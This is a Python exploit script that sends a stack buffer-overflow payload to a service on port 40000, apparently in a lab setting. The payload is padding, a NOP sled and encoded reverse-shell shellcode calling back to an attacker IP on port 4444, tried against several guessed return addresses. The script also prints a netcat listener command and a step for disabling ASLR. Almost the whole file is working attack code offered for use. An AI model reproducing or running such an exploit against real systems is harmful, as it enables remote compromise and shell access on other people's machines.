#!/usr/bin/python3
import socket
import struct
import sys
import time

# Target information
target_ip = "127.0.0.1"  # Change to the target IP if different
target_port = 40000

# Your attacking machine's information
attacker_ip = "192.168.147.135"  # YOUR ACTUAL IP - ALREADY SET
attacker_port = 4444

# Buffer overflow parameters
buffer_size = 512  # This is our assumed buffer size - might need adjustment
nop_sled_size = 128  # Increased NOP sled for better reliability

# Pre-generated shellcode for a reverse shell to 192.168.147.135:4444
# This is a linux/x86/shell_reverse_tcp payload
shellcode = (
    b"\xdb\xd2\xb8\xe7\x1d\x61\x2c\xd9\x74\x24\xf4"
    b"\x5f\x2b\xc9\xb1\x12\x83\xc7\x04\x31\x47\x13"
    b"\x03\xa0\x0e\x83\xd9\x1f\xea\xb4\xc1\x0c\x4f"
    b"\x68\x6c\xb0\xc6\x6f\xc0\xd2\x15\xef\xb2\x43"
    b"\x16\xcf\x79\xf3\x1f\x49\x7b\x9b\x5f\x01\xe8"
    b"\xdc\x08\x50\x0f\xf3\x94\xdd\xee\x43\x42\x8e"
    b"\xa1\xf0\x38\x2d\xcb\x17\xf3\xb2\x99\xbf\x62"
    b"\x9c\x6e\x57\x13\xcd\xbf\xc5\x8a\x98\x23\x5b"
    b"\x1e\x12\x42\xeb\xab\xe9\x05"
)

print(f"[+] Using pre-generated shellcode for reverse shell to {attacker_ip}:{attacker_port}")
print(f"[+] Shellcode size: {len(shellcode)} bytes")

# Create a NOP sled
nop_sled = b"\x90" * nop_sled_size

# Try multiple possible return addresses
# We'll test a range of addresses to increase our chances of success
possible_addresses = [
    0xbffff350,  # Base address estimate
    0xbffff300,  # Lower bound
    0xbffff250,  # Even lower
    0xbffff400,  # Upper bound
    0xbffff450,  # Even higher
]

# Function to try an exploit with a specific return address
def try_exploit(ret_address):
    print(f"[*] Trying return address: 0x{ret_address:08x}")
    
    # Calculate padding size to maintain overall buffer size
    padding_size = buffer_size - len(nop_sled) - len(shellcode)
    if padding_size < 0:
        print(f"[-] Warning: NOP sled + shellcode exceeds buffer size. Reducing NOP sled.")
        nop_sled_size = buffer_size - len(shellcode) - 4  # Leave space for at least 4 bytes of padding
        if nop_sled_size < 0:
            print(f"[-] Error: Shellcode is too large for the buffer size!")
            return False
        padding_size = 4
    
    padding = b"A" * padding_size
    
    # Pack the return address in little-endian format
    ret_address_packed = struct.pack("<I", ret_address)
    
    # Construct full payload
    payload = padding + nop_sled + shellcode + ret_address_packed
    
    try:
        # Connect to the target
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)  # Set a timeout for the connection
        s.connect((target_ip, target_port))
        print(f"[+] Connected to {target_ip}:{target_port}")
        
        # Send the payload
        print(f"[+] Sending payload ({len(payload)} bytes)...")
        s.send(payload)
        s.close()
        print("[+] Payload sent successfully!")
        
        # Give the reverse shell some time to connect back
        print("[*] Waiting for reverse shell connection...")
        time.sleep(2)
        
        return True
    
    except Exception as e:
        print(f"[-] Exploit attempt failed: {e}")
        return False

# First, check if netcat is listening
print(f"[*] Make sure you have a netcat listener running on port {attacker_port}:")
print(f"    nc -lvp {attacker_port}")
input("[*] Press Enter to continue...")

# Try each possible return address
for addr in possible_addresses:
    if try_exploit(addr):
        print("[*] Exploit payload sent. Check your netcat listener.")
        time.sleep(1)

print("[*] All exploitation attempts completed.")
print("[*] If you didn't get a shell, try the following:")
print("    1. Verify the buffer size (currently set to {})".format(buffer_size))
print("    2. Adjust the return addresses")
print("    3. Make sure ASLR is disabled: echo 0 > /proc/sys/kernel/randomize_va_space")
print("    4. Check network connectivity between the target and your machine")
print("    5. Verify that your IP address is correctly set in the script")